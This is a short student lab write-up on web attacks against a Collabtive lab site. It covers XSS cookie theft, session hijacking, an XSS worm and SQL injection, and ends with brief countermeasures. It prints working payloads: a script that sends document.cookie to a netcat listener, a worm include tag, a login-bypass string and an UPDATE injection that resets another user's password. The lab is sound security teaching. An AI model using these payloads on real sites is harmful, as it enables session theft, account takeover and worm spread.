#1 Coockies
1.1 Stealing the User's Cookie

Cookie is a small piece of data sent from a website and stored in a user's web browser while the user is browsing that website.
In this part of the lab I was performing an exploit that is stealing user's cookies.

Modify company field:
<script>document.write('<img src=http://127.0.0.1:1234/i?cook=' + escape(document.cookie) + '>');</script>
Run terminal command: nc -l 1234
Cookie recieved: PHPSESSID%3Dig6pmi15jqopc4de3ni380j4e7 (without PHPSSID)

1.2 Session Hijacking

Made a JS code, which generates a new project with the specified descriptions. HTML opens firefox and executes the JS code.

~Run highjack.html file to execute exploit. It will create new project in the xsslabcollabtive website.

#2 XSS Worm

XSS Worm is a malicious JavaScript code which injects itself in the website though browser security and infects visitors of that website.
 
Place worm in the following directory:
/var/www/XSS/Collabtive/
Write the following script in the Company field in the user you want to be infected:
<script type='text/javascript' src='http://www.xsslabcollabtive.com/worms.js'></script>

Log out of the infected User and log in with victim user. Visit infected user's profile from victim's user, which will infect victim user.

#3 SQL Injections

SQL Injections inserts SQL query via input data from client to the application, which can read and modify data from database.

Before starting this part we need to disable SQL injection Prevention by disabling magic quotes. We do so by following this procedure:
1. Go to /etc/php5/apache2/php.ini.
2. Find the line: magic quotes gpc = On.
3. Change it to this: magic quotes gpc = Off.
4. Restart the Apache server by running "sudo service apache2 restart".

3.2 SQL Injection Attack on SELECT Statements

Part 1:
Entering "admin'); #" in the login field will allow user to login with any password. It will set login field to admin and comment out everything else in the line including the password field.

Part 2:
It is not possible to modify database using method in the part 1 is because MySQL database does not allow query stacking. If we try to update database using "admin'); UPDATE user SET pass=?'pass' WHERE name=?'admin'; #" it would split query into two, thus not allowing us to perform the attack.

3.3 SQL Injection on UPDATE Statements

Modify company field to
', `pass` = 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d' WHERE ID = 4 #
This will change password of user with ID 4, which is Ted, to 'hello'. Now user will be able to log in under Ted's name with password 'hello'

3.4 Counter measures

Preventing SQL injection attacks
mysql_real_escape_string();
uncommenting: line 371, 372, 88

Edited function edit and funtion login